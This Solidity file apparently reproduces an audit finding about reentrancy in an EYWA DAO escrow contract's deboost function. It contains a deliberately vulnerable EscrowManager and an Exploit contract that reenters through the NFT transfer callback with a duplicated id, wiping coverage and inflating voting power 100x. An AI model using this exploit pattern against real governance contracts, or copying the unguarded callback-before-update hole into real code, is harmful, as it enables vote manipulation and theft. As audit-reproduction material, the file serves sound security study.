// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  EYWA DAO — EscrowManager.deboost reenters through safeTransferFrom
    (MixBytes, report 2025-01-15, finding 4).
    The same booster id is passed four times. Each transfer callbacks into the
    holder, which sends the NFT back before coverage is reduced. Coverage falls
    from 100 to 0 while the NFT sits in the escrow again, and voting power
    goes from 100e18 to 10000e18. */

interface IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}

contract Collection {
    mapping(uint256 => address) public ownerOf;

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "minted");
        ownerOf[id] = to;
    }

    function transferFrom(address from, address to, uint256 id) public {
        require(ownerOf[id] == from, "owner");
        require(msg.sender == from || msg.sender == ownerOf[id], "auth");
        ownerOf[id] = to;
    }

    function safeTransferFrom(address from, address to, uint256 id) external {
        transferFrom(from, to, id);
        if (to.code.length > 0) {
            bytes4 ret = IERC721Receiver(to).onERC721Received(msg.sender, from, id, "");
            require(ret == IERC721Receiver.onERC721Received.selector, "receiver");
        }
    }
}

contract EscrowManager {
    struct Lock {
        uint256 amount;
        uint256 coverage;
        address owner;
    }

    Collection public collection;
    mapping(uint256 => Lock) public locks;
    mapping(address => uint256) public lockOf;
    mapping(uint256 => uint256) public boosterValue;

    constructor(Collection _collection) {
        collection = _collection;
    }

    function openLock(address owner, uint256 escrowId, uint256 amount, uint256 coverage) external {
        locks[escrowId] = Lock(amount, coverage, owner);
        lockOf[owner] = escrowId;
    }

    function setBooster(uint256 id, uint256 value) external {
        boosterValue[id] = value;
    }

    function votes(address who) public view returns (uint256) {
        Lock storage L = locks[lockOf[who]];
        if (L.coverage == 0) return L.amount * 100;
        return L.amount * 100 / L.coverage;
    }

    function deboost(uint256 escrowId, uint256[] calldata collectionTokenIds) external {
        Lock storage L = locks[escrowId];
        require(msg.sender == L.owner, "owner");
        for (uint256 i = 0; i < collectionTokenIds.length; i++) {
            uint256 id = collectionTokenIds[i];
            uint256 boost = boosterValue[id];
            // @> VULN: safeTransferFrom callbacks before this id is removed from coverage, so a duplicate id is counted again
            collection.safeTransferFrom(address(this), L.owner, id);
            if (L.coverage >= boost) {
                L.coverage -= boost;
            } else {
                L.coverage = 0;
            }
        }
    }
}

contract Exploit {
    Collection public collection; // nonce 1
    EscrowManager public escrow; // nonce 2

    uint256 public votesBefore;
    uint256 public votesAfter;
    uint256 public exploiting;

    constructor() {
        collection = new Collection();
        escrow = new EscrowManager(collection);
        collection.mint(address(escrow), 1);
        escrow.setBooster(1, 25);
        escrow.openLock(address(this), 1, 100 ether, 100);
    }

    function onERC721Received(address, address, uint256 id, bytes calldata) external returns (bytes4) {
        require(msg.sender == address(collection), "collection");
        if (exploiting > 0) {
            exploiting -= 1;
            collection.transferFrom(address(this), address(escrow), id);
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function run() external {
        votesBefore = escrow.votes(address(this));
        uint256[] memory ids = new uint256[](4);
        ids[0] = 1;
        ids[1] = 1;
        ids[2] = 1;
        ids[3] = 1;
        exploiting = 4;
        escrow.deboost(1, ids);
        votesAfter = escrow.votes(address(this));
        (uint256 amount, uint256 coverage, address owner) = escrow.locks(1);
        require(votesBefore == 100 ether, "votes before");
        require(coverage == 0, "coverage wiped");
        require(votesAfter == 10_000 ether, "votes inflated");
        require(votesAfter == votesBefore * 100, "100x");
        require(collection.ownerOf(1) == address(escrow), "booster returned");
        require(amount == 100 ether && owner == address(this), "lock intact");
        require(exploiting == 0, "all callbacks");
    }
}
